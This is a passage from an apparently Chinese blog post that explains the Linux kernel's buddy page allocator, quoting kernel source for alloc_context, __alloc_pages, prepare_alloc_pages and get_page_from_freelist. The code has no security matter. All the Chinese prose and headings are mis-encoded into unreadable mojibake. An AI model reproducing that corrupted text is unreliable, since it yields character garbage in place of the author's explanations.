id="alloc-contextç»“æ„ä½“"><a href="#alloc-contextç»“æ„ä½“" class="headerlink" title="alloc_contextç»“æ„ä½“"></a>alloc_contextç»“æ„ä½“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line"><span class="keyword">nodemask_t</span> *nodemask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line"><span class="keyword">int</span> migratetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * highest_zoneidx represents highest usable zone index of</span></span><br><span class="line"><span class="comment"> * the allocation request. Due to the nature of the zone,</span></span><br><span class="line"><span class="comment"> * memory on lower zone than the highest_zoneidx will be</span></span><br><span class="line"><span class="comment"> * protected by lowmem_reserve[highest_zoneidx].</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * highest_zoneidx is also used by reclaim/compaction to limit</span></span><br><span class="line"><span class="comment"> * the target zone since higher zone than this index cannot be</span></span><br><span class="line"><span class="comment"> * usable for this allocation request.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">highest_zoneidx</span>;</span></span><br><span class="line"><span class="keyword">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªåˆ†é…è¿‡ç¨‹ä¸­éå¸¸é‡è¦çš„ç»“æ„ä½“ï¼Œç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬å•æ¬¡å†…å­˜åˆ†é…çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p><p>è¿™é‡Œä¸»è¦å…³æ³¨çš„æ˜¯å…¶ä¸­çš„ä¸€ä¸ªæˆå‘˜<code>zonelist</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¯¥æˆå‘˜è¡¨ç¤ºåœ¨è¿™ä¸€æ¬¡çš„åˆ†é…ä¸Šä¸‹æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è¦æ“ä½œçš„ zone çš„åˆ—è¡¨ï¼Œå…¶ä¸ºä¸€ä¸ª <code>zonelist</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ã€‚å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸ºä¸€ä¸ª <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* Pointer to actual zone */</span></span><br><span class="line"><span class="keyword">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªç»“æ„ä½“åœ¨ä¸Šæ–‡ä¸­æè¿‡ï¼ŒåŒ…å«äº†ä¸€ä¸ª zone çš„æŒ‡é’ˆä»¥åŠä¸€ä¸ª indexã€‚</p><p>éšåå†çœ‹<code>alloc_context</code>ç»“æ„ä½“ä¸­çš„<code>preferred_zoneref</code>æˆå‘˜ï¼Œè¯¥æˆå‘˜ä¸ºä¸€ä¸ª <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“ï¼Œè¡¨ç¤ºä¼˜å…ˆç”¨æ¥è¿›è¡Œåˆ†é…çš„ zoneã€‚</p><p>æœ€ååˆ™æ˜¯<code>spread_dirty_pages</code>æˆå‘˜ï¼Œè¡¨ç¤ºæ­¤æ¬¡åˆ†é…æ˜¯å¦å¯èƒ½äº§ç”Ÿè„é¡µï¼ˆéœ€è¦è¿›è¡Œå†™å›ï¼‰ï¼Œé€šå¸¸åˆ†é…éœ€è¦å†™å…¥çš„é¡µä¼šå‡ºç°ã€‚</p><h2 id="alloc-pageså‡½æ•°"><a href="#alloc-pageså‡½æ•°" class="headerlink" title="__alloc_pageså‡½æ•°"></a>__alloc_pageså‡½æ•°</h2><p>æ­¤å‡½æ•°ä¸º<code>buddy system</code>åˆ†é…é¡µé¢çš„æ ¸å¿ƒå‡½æ•°ï¼Œæ‰€æœ‰çš„é¡µé¢åˆ†é… API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">alloc_pages</span>(<span class="title">gfp_t</span> <span class="title">gfp</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">preferred_nid</span>,</span></span><br><span class="line"><span class="class"><span class="title">nodemask_t</span> *<span class="title">nodemask</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags = ALLOC_WMARK_LOW;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_gfp; <span class="comment">/* The gfp_t that was actually used for allocation */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> <span class="title">ac</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * There are several places where we assume that the order value is sane</span></span><br><span class="line"><span class="comment"> * so bail out early if the request is out of bound.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE_GFP(order &gt; MAX_ORDER, gfp))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">gfp &amp;= gfp_allowed_mask;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Apply scoped allocation constraints. This is mainly about GFP_NOFS</span></span><br><span class="line"><span class="comment"> * resp. GFP_NOIO which has to be inherited for all allocation requests</span></span><br><span class="line"><span class="comment"> * from a particular context which has been marked by</span></span><br><span class="line"><span class="comment"> * memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;. And PF_MEMALLOC_PIN which ensures</span></span><br><span class="line"><span class="comment"> * movable zones are not used during allocation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">gfp = current_gfp_context(gfp);</span><br><span class="line">alloc_gfp = gfp;</span><br><span class="line"><span class="keyword">if</span> (!prepare_alloc_pages(gfp, order, preferred_nid, nodemask, &amp;ac,</span><br><span class="line">&amp;alloc_gfp, &amp;alloc_flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Forbid the first pass from falling back to types that fragment</span></span><br><span class="line"><span class="comment"> * memory until all local zones are considered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* First allocation attempt */</span></span><br><span class="line">page = get_page_from_freelist(alloc_gfp, order, alloc_flags, &amp;ac);</span><br><span class="line"><span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">alloc_gfp = gfp;</span><br><span class="line">ac.spread_dirty_pages = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Restore the original nodemask if it was potentially replaced with</span></span><br><span class="line"><span class="comment"> * &amp;cpuset_current_mems_allowed to optimize the fast-path attempt.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac.nodemask = nodemask;</span><br><span class="line"></span><br><span class="line">page = __alloc_pages_slowpath(alloc_gfp, order, &amp;ac);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_online() &amp;&amp; (gfp &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;</span><br><span class="line">    unlikely(__memcg_kmem_charge_page(page, gfp, order) != <span class="number">0</span>)) &#123;</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trace_mm_page_alloc(page, order, alloc_gfp, ac.migratetype);</span><br><span class="line">kmsan_alloc_page(page, order, alloc_gfp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__alloc_pages);</span><br></pre></td></tr></table></figure><p>å‡½æ•°éœ€è¦ä¼ å…¥å››ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯<code>gfp</code>åˆ†é…è¡Œä¸ºå‚æ•°ã€<code>order</code>åˆ†é…çš„ç‰©ç†é¡µæ¡†çš„é˜¶ã€<code>preferred_nid</code>é€‰å–çš„èŠ‚ç‚¹idã€<code>nodemask</code>åˆ†é…æ—¶å¯ä¾›å€™é€‰çš„nodeæ©ç ã€‚</p><p>å› ä¸ºåœ¨å‰é¢çš„æ–‡ç« ä¸­å·²ç»æåˆ°è¿‡äº†å†…å­˜åˆ†é…ï¼Œä¸è¿‡åªæ˜¯ä»slabä¸­åˆ†é…æˆ‘ä»¬ä¹Ÿå¤§æ¦‚æ¸…æ¥šå†…å­˜åˆ†é…å‡½æ•°ä¸€èˆ¬çš„æµç¨‹ï¼Œè¿™é‡Œä¹Ÿä¸ä¾‹å¤–ã€‚é¦–å…ˆï¼Œæ£€æŸ¥å‚æ•°åˆæ³•æ€§ï¼Œå¹¶åšåˆ†é…å‰å‡†å¤‡å·¥ä½œã€‚éšåè¿›è¡Œå¿«é€Ÿåˆ†é…ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›ç»“æœã€‚æœ€åï¼Œè‹¥å¿«é€Ÿåˆ†é…å¤±è´¥ï¼Œåˆ™è¿›è¡Œæ…¢é€Ÿåˆ†é…ã€‚</p><p>æ¥ä¸‹æ¥å°±ç»§ç»­ç»†è‡´çš„å¼€å§‹åˆ†æå‡½æ•°äº†ï¼Œè¿›å…¥å‡½æ•°ä¼šå…ˆæ£€éªŒ<code>order</code>æ˜¯å¦è¶…è¿‡äº†<code>MAX_ORDER</code>ã€‚éšåä¼šè¿›å…¥åˆ°<code>prepare_alloc_pages</code>å‡½æ•°è¿›è¡Œåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">prepare_alloc_pages</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> preferred_nid, <span class="keyword">nodemask_t</span> *nodemask,</span></span></span><br><span class="line"><span class="params"><span class="function">struct alloc_context *ac, <span class="keyword">gfp_t</span> *alloc_gfp,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> *alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);</span><br><span class="line">ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask);</span><br><span class="line">ac-&gt;nodemask = nodemask;</span><br><span class="line">ac-&gt;migratetype = gfp_migratetype(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled()) &#123;</span><br><span class="line">*alloc_gfp |= __GFP_HARDWALL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When we are in the interrupt context, it is irrelevant</span></span><br><span class="line"><span class="comment"> * to the current task context. It means that any node ok.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (in_task() &amp;&amp; !ac-&gt;nodemask)</span><br><span class="line">ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*alloc_flags |= ALLOC_CPUSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">might_alloc(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_fail_alloc_page(gfp_mask, order))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">*alloc_flags = gfp_to_alloc_flags_cma(gfp_mask, *alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dirty zone balancing only done in the fast path */</span></span><br><span class="line">ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The preferred zone is used for statistics but crucially it is</span></span><br><span class="line"><span class="comment"> * also used as the starting point for the zonelist iterator. It</span></span><br><span class="line"><span class="comment"> * may get reset for allocations that ignore memory policies.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨<code>node_zonelist</code>å‡½æ•°ä»<code>preferred_nid</code>å‚æ•°æŒ‡å®šçš„nodeä¸­è·å–ä¸€ä¸ª<code>zonelist</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NODE_DATA(nid)(node_data[nid])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct zonelist *<span class="title">node_zonelist</span><span class="params">(<span class="keyword">int</span> nid, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> NODE_DATA(nid)-&gt;node_zonelists + gfp_zonelist(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œ cpuset ç›¸å…³åˆ¤æ–­ä¸æ ‡å¿—ä½è®¾ç½®ï¼Œè‹¥æ˜¯åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡åˆ™ç›´æ¥å°† nodemask è®¾ä¸º <code>cpuset_current_mems_allowed</code>ã€‚</p><p>æœ€åè°ƒç”¨ <code>first_zones_zonelist()</code> è®¾ç½®<code>preferred zone</code>ï¼Œå¤§æ¦‚æ˜¯åœ¨<code>zonelist</code>ä¸­<code>nodemask</code>æ‰€åŒ…å«çš„zoneä¸­ <code>highest_zoneidx</code> ä»¥ä¸‹çš„ç¬¬ä¸€ä¸ª zoneã€‚</p><p>æ€»çš„æ¥è¯´è¿™ä¸ªå‡½æ•°ä¸»è¦åšçš„äº‹å°±æ˜¯åˆ†é…å‰çš„ä¸€äº›å‡†å¤‡çš„å·¥ä½œï¼ŒåŒ…æ‹¬åˆå§‹åŒ– <code>alloc_context</code> ç»“æ„ä½“ã€è·å– zone æ•°ç»„ç­‰ã€‚</p><h3 id="get-page-from-freelistå‡½æ•°"><a href="#get-page-from-freelistå‡½æ•°" class="headerlink" title="get_page_from_freelistå‡½æ•°"></a>get_page_from_freelistå‡½æ•°</h3><p>æ ¹æ®<code>__alloc_pages</code>å‡½æ•°çš„æµç¨‹ï¼Œæ¥ä¸‹æ¥è¿›å…¥çš„å°±æ˜¯<code>get_page_from_freelist</code>å‡½æ•°äº†ï¼Œè€Œè¿™ä¸€å‡½æ•°å°±æ˜¯å‰é¢æåˆ°çš„å¿«é€Ÿåˆ†é…è·¯å¾„äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct page *</span></span><br><span class="line"><span class="function"><span class="title">get_page_from_freelist</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct alloc_context *ac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">last_pgdat</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> last_pgdat_dirty_ok = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> no_fallback;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Scan zonelist, looking for a zone with enough free.</span></span><br><span class="line"><span class="comment"> * See also cpuset_node_allowed() comment in kernel/cgroup/cpuset.c.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;</span><br><span class="line">z = ac-&gt;preferred_zoneref;</span><br><span class="line">for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,</span><br><span class="line">ac-&gt;nodemask) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mark;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled() &amp;&amp;</span><br><span class="line">(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;</span><br><span class="line">!__cpuset_zone_allowed(zone, gfp_mask))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When allocating a page cache page for writing, we</span></span><br><span class="line"><span class="comment"> * want to get it from a node that is within its dirty</span></span><br><span class="line"><span class="comment"> * limit, such that no single node holds more than its</span></span><br><span class="line"><span class="comment"> * proportional share of globally allowed dirty pages.</span></span><br><span class="line"><span class="comment"> * The dirty limits take into account the node&#x27;s</span></span><br><span class="line"><span class="comment"> * lowmem reserves and high watermark so that kswapd</span></span><br><span class="line"><span class="comment"> * should be able to balance it without having to</span></span><br><span class="line"><span class="comment"> * write pages from its LRU list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">XXX:</span> For now, allow allocations to potentially</span></span><br><span class="line"><span class="comment"> * exceed the per-node dirty limit in the slowpath</span></span><br><span class="line"><span class="comment"> * (spread_dirty_pages unset) before going into reclaim,</span></span><br><span class="line"><span class="comment"> * which is important when on a NUMA setup the allowed</span></span><br><span class="line"><span class="comment"> * nodes are together not big enough to reach the</span></span><br><span class="line"><span class="comment"> * global limit.  The proper fix for these situations</span></span><br><span class="line"><span class="comment"> * will require awareness of nodes in the</span></span><br><span class="line"><span class="comment"> * dirty-throttling and the flusher threads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;</span><br><span class="line"><span class="keyword">if</span> (last_pgdat != zone-&gt;zone_pgdat) &#123;</span><br><span class="line">last_pgdat = zone-&gt;zone_pgdat;</span><br><span class="line">last_pgdat_dirty_ok = node_dirty_ok(zone-&gt;zone_pgdat);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!last_pgdat_dirty_ok)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;</span><br><span class="line"><span class="keyword">int</span> local_nid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If moving to a remote node, retry but allow</span></span><br><span class="line"><span class="comment"> * fragmenting fallbacks. Locality is more important</span></span><br><span class="line"><span class="comment"> * than fragmentation avoidance.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);</span><br><span class="line"><span class="keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Detect whether the number of free pages is below high</span></span><br><span class="line"><span class="comment"> * watermark.  If so, we will decrease pcp-&gt;high and free</span></span><br><span class="line"><span class="comment"> * PCP pages in free path to reduce the possibility of</span></span><br><span class="line"><span class="comment"> * premature page reclaiming.  Detection is done here to</span></span><br><span class="line"><span class="comment"> * avoid to do that in hotter free path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(ZONE_BELOW_HIGH, &amp;zone-&gt;flags))</span><br><span class="line"><span class="keyword">goto</span> check_alloc_wmark;</span><br><span class="line"></span><br><span class="line">mark = high_wmark_pages(zone);</span><br><span class="line"><span class="keyword">if</span> (zone_watermark_fast(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">gfp_mask))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">set_bit(ZONE_BELOW_HIGH, &amp;zone-&gt;flags);</span><br><span class="line"></span><br><span class="line">check_alloc_wmark:</span><br><span 